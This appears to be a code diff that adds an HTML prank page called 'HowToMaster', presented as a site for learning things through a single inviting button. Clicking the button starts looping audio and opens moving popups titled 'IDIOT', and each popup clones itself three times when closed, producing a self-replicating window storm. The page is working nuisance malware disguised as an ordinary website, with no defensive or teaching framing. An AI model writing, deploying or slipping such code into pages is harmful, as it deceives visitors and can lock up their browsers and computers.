@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HowToMaster</title>
+    <script>
+        const popupImageURL = "/cat.webp";
+        const popupSize = 325;
+        const audio = new Audio("/wholesome.mp3");
+        audio.volume = 1;
+        audio.loop = true;
+        audio.play().catch(() => {
+            console.warn("Playback blocked");
+        });
+
+
+        function openPopup(startX = null, startY = null, cloneContent = null) {
+            const screenW = window.screen.availWidth;
+            const screenH = window.screen.availHeight;
+
+            const x = startX ?? Math.floor(Math.random() * (screenW - popupSize));
+            const y = startY ?? Math.floor(Math.random() * (screenH - popupSize));
+
+            const popup = window.open("", "", `width=${popupSize},height=${popupSize},left=${x},top=${y}`);
+            if (!popup) return;
+
+            const popupHTML = cloneContent ?? `
+<html>
+  <head><title>IDIOT</title></head>
+  <body style="margin:0; background:black; color:white; text-align:center; overflow:hidden;">
+    <img src="${popupImageURL}" style="width:100%;">
+    <script>
+      window.onload = () => {
+        const audio = document.getElementById("popup-audio");
+        audio.play().catch(() => {
+          console.warn("Audio playback was blocked");
+        });
+      };
+
+      const popupSize = ${popupSize};
+      let x = screenX;
+      let y = screenY;
+      let dx = Math.random() < 0.5 ? 1 : -1;
+      let dy = Math.random() < 0.5 ? 1 : -1;
+      let speed = 2;
+
+      function move() {
+        x += dx * speed;
+        y += dy * speed;
+
+        if (x <= 0 || x + popupSize >= screen.availWidth) dx *= -1;
+        if (y <= 0 || y + popupSize >= screen.availHeight) dy *= -1;
+
+        try {
+          window.moveTo(x, y);
+        } catch (e) {}
+      }
+
+      setInterval(move, 30);
+
+      // Klonowanie siebie przy zamknięciu
+      window.onbeforeunload = () => {
+        const html = document.documentElement.outerHTML;
+        for (let i = 0; i < 3; i++) {
+          const newPopup = window.open("", "_blank", "width=" + popupSize + ",height=" + popupSize);
+          if (newPopup) {
+            newPopup.document.open();
+            newPopup.document.write(html);
+            newPopup.document.close();
+          }
+        }
+      };
+    <\/script>
+  </body>
+</html>
+`;
+
+            try {
+                popup.document.open();
+                popup.document.write(popupHTML);
+                popup.document.close();
+            } catch (e) {}
+        }
+
+        let started = false;
+        function startPrank() {
+            if (started) return;
+            started = true;
+
+            const audio = document.getElementById("main-audio");
+            audio.play().catch((e) => {
+                console.warn("Nie udało się odtworzyć audio:", e);
+            });
+
+            for (let i = 0; i < 2; i++) openPopup();
+        }
+    </script>
+</head>
+<body style="
+  background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+  color: #f0f0f0;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  height: 100vh;
+  margin: 0;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+">
+
+<!-- Audio (ukryte, dla głównej strony) -->
+<audio id="main-audio" src="/wholesome.mp3" loop></audio>
+
+<button onclick="startPrank()" style="
+    background-color: #1abc9c;
+    border: none;
+    border-radius: 8px;
+    padding: 18px 50px;
+    font-size: 22px;
+    font-weight: 600;
+    color: #ffffff;
+    cursor: pointer;
+    box-shadow: 0 6px 15px rgba(26, 188, 156, 0.5);
+    transition: background-color 0.3s ease, transform 0.2s ease;
+  "
+        onmouseover="this.style.backgroundColor='#16a085'; this.style.transform='scale(1.05)'"
+        onmouseout="this.style.backgroundColor='#1abc9c'; this.style.transform='scale(1)'"
+>
+    Enter the website and master what you want.
+</button>
+
+</body>
+</html>
